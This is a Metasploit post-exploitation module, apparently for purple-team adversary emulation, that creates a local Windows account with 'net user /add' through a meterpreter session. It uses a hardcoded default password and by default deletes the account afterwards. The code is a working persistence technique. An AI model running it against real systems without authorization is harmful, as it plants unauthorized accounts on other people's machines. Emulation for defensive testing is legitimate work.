##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info, 'Name'          => 'Create Account (T1136) Windows - Purple Team',
                      'Description'   => %q{ Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.
The net user commands can be used to create a local or domain account. This module creates a local account.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
      [
        OptString.new("USERNAME", [ true, "Username for the new account", "t1136"]),
        OptString.new("PASSWORD", [ true, "password for the new account", "t1136T1136!"]),
        OptBool.new("CLEANUP", [ true, "Delete account", true])
      ])
  end

  def run
    begin
    raise "Requires meterpreter" if session.type != "meterpreter"
    raise "Requires admin" unless is_admin?

    print_status("creating local account #{datastore['USERNAME']}")
    cmd = "net user /add #{datastore['USERNAME']} #{datastore['PASSWORD']}"

    output = cmd_exec(cmd)
    print_status(output)

    output = cmd_exec("net user")
    if output =~ /#{datastore['USERNAME']}/
      print_status(output)
      print_good("Module T1136 completed successfully")
    else
      print_error("Module T1136 Failed")
    end

    if datastore['CLEANUP']
      print_status("removing account")
      result = cmd_exec("net user /delete #{datastore['USERNAME']}")
      print_status(result)
    end

    rescue ::Exception => e
      print_error("Unable to execute: #{e.message}")
      return
    end
  end
end
